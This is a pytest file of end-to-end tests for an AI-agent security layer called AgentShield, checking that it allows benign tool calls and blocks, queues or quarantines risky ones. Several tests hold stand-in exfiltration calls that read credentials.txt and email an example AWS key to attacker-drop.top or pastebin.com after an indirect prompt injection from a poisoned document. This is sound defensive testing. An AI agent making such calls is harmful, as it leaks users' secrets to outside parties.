"""Whole-system tests: adapter -> pipeline -> policy -> proxy -> tool."""

from __future__ import annotations

import pytest

from agentshield import AgentShield, ContextChunk, Decision, TrustLevel
from agentshield.core.exceptions import ApprovalRequired, ToolCallBlocked
from agentshield.proxy.commands import CommandStatus, SendEmailCommand
from agentshield.report import render
from tests.conftest import POISONED_DOCUMENT


def test_benign_email_is_delivered(shield: AgentShield, analyst):
    call = shield.normalize(
        {
            "function": {
                "name": "send_email",
                "arguments": '{"recipient": "maya@example.com", "body": "Revenue is up 12%."}',
            }
        },
        framework="openai",
        principal=analyst,
        session_id="s-benign",
    )
    command = shield.invoke(call)
    assert command.status is CommandStatus.EXECUTED
    assert command.assessment.decision is Decision.ALLOW
    outbox = shield.proxy.registry.get("send_email").outbox
    assert outbox[-1]["recipient"] == "maya@example.com"


def test_indirect_injection_exfiltration_is_blocked(shield: AgentShield, analyst):
    call = shield.normalize(
        {
            "tool": "send_email",
            "arguments": {
                "recipient": "exfil@attacker-drop.top",
                "body": "AKIAIOSFODNN7EXAMPLE",
            },
        },
        principal=analyst,
        session_id="s-attack",
        context=[ContextChunk(POISONED_DOCUMENT, "report.txt", TrustLevel.UNTRUSTED)],
    )
    with pytest.raises(ToolCallBlocked) as error:
        shield.invoke(call)
    assessment = error.value.assessment
    assert assessment.risk_score >= 90
    categories = {s.category for s in assessment.signals}
    assert "indirect_prompt_injection" in categories
    assert "sensitive_data_egress" in categories
    # nothing left the building
    assert shield.proxy.registry.get("send_email").outbox == []


def test_blocked_call_never_reaches_the_tool(shield: AgentShield, analyst):
    class Exploding:
        name = "send_email"

        def execute(self, **kwargs):
            raise AssertionError("the tool must not be reached")

    shield.register(Exploding(), name="send_email")
    call = shield.normalize(
        {"tool": "send_email", "arguments": {"recipient": "x@attacker-drop.top"}},
        principal=analyst,
        session_id="s-never",
    )
    with pytest.raises(ToolCallBlocked):
        shield.invoke(call)


def test_multi_step_attack_escalates_the_session(shield: AgentShield, analyst):
    session = "s-seq"
    shield.invoke(
        shield.normalize(
            {"tool": "read_file", "arguments": {"path": "credentials.txt"}},
            principal=analyst,
            session_id=session,
        ),
        raise_on_deny=False,
    )
    shield.invoke(
        shield.normalize(
            {"tool": "web_search", "arguments": {"query": "contacts"}},
            principal=analyst,
            session_id=session,
        ),
        raise_on_deny=False,
    )
    command = shield.invoke(
        shield.normalize(
            {
                "tool": "send_email",
                "arguments": {"recipient": "drop@pastebin.com", "body": "AKIAIOSFODNN7EXAMPLE"},
            },
            principal=analyst,
            session_id=session,
        ),
        raise_on_deny=False,
    )
    assessment = command.assessment
    assert assessment.decision is Decision.BLOCK
    assert any(s.category == "suspicious_sequence" for s in assessment.signals)
    assert assessment.resulting_state in {"RESTRICTED", "QUARANTINED"}


def test_grey_area_call_is_queued_then_approved(shield: AgentShield, analyst):
    call = shield.normalize(
        {
            "tool": "send_email",
            "arguments": {"recipient": "partner@vendor-portal.xyz", "body": "invoice"},
        },
        principal=analyst,
        session_id="s-approval",
    )
    with pytest.raises(ApprovalRequired) as error:
        shield.invoke(call)

    call_id = error.value.assessment.call.call_id
    assert len(shield.pending_approvals) == 1
    result = shield.approve(call_id)
    assert result["sent"] is True
    assert shield.pending_approvals == []


def test_denied_approval_never_executes(shield: AgentShield, analyst):
    call = shield.normalize(
        {
            "tool": "send_email",
            "arguments": {"recipient": "partner@vendor-portal.xyz", "body": "invoice"},
        },
        principal=analyst,
        session_id="s-deny",
    )
    command = shield.invoke(call, raise_on_deny=False)
    shield.deny(call.call_id)
    assert command.status is CommandStatus.DENIED
    assert shield.proxy.registry.get("send_email").outbox == []


def test_quarantined_session_refuses_everything(shield: AgentShield, analyst):
    session = "s-quarantine"
    for _ in range(2):
        shield.invoke(
            shield.normalize(
                {
                    "tool": "send_email",
                    "arguments": {"recipient": "x@attacker-drop.top", "body": "AKIAIOSFODNN7EXAMPLE"},
                },
                principal=analyst,
                session_id=session,
            ),
            raise_on_deny=False,
        )
    harmless = shield.invoke(
        shield.normalize(
            {"tool": "read_file", "arguments": {"path": "notes.txt"}},
            principal=analyst,
            session_id=session,
        ),
        raise_on_deny=False,
    )
    assert harmless.assessment.decision is Decision.BLOCK

    shield.reset_session(session)
    recovered = shield.invoke(
        shield.normalize(
            {"tool": "read_file", "arguments": {"path": "notes.txt"}},
            principal=analyst,
            session_id=session,
        ),
        raise_on_deny=False,
    )
    assert recovered.assessment.decision is Decision.ALLOW


def test_ungranted_tool_is_refused(shield: AgentShield, analyst):
    shield.register(
        type("Noop", (), {"name": "write_file", "execute": lambda self, **kw: None})()
    )
    call = shield.normalize(
        {"tool": "write_file", "arguments": {"path": "x.txt", "content": "y"}},
        principal=analyst,
        session_id="s-grant",
    )
    with pytest.raises(ToolCallBlocked) as error:
        shield.invoke(call)
    assert error.value.assessment.signals[0].category == "unauthorized_tool"


def test_command_objects_describe_themselves(shield: AgentShield, analyst):
    call = shield.normalize(
        {"tool": "send_email", "arguments": {"recipient": "maya@example.com", "subject": "hi"}},
        principal=analyst,
        session_id="s-cmd",
    )
    command = shield.invoke(call, raise_on_deny=False)
    assert isinstance(command, SendEmailCommand)
    assert "maya@example.com" in command.describe()
    assert command.to_dict()["status"] == "EXECUTED"


def test_metrics_and_audit_record_every_call(shield: AgentShield, analyst):
    for recipient in ("maya@example.com", "x@attacker-drop.top"):
        shield.invoke(
            shield.normalize(
                {"tool": "send_email", "arguments": {"recipient": recipient, "body": "hi"}},
                principal=analyst,
                session_id="s-metrics",
            ),
            raise_on_deny=False,
        )
    stats = shield.stats()
    assert stats["evaluated"] == 2
    assert stats["decisions"]["BLOCK"] == 1
    assert len(shield.audit.records) > 2
    assert shield.alerts.alerts


def test_report_renders_the_panel(shield: AgentShield, analyst):
    assessment = shield.inspect(
        {"tool": "send_email", "arguments": {"recipient": "x@attacker-drop.top", "body": "hi"}},
        principal=analyst,
        session_id="s-report",
    )
    panel = render(assessment)
    assert "AGENTSHIELD SECURITY" in panel
    assert "ACTION BLOCKED" in panel
    assert "Risk score" in panel
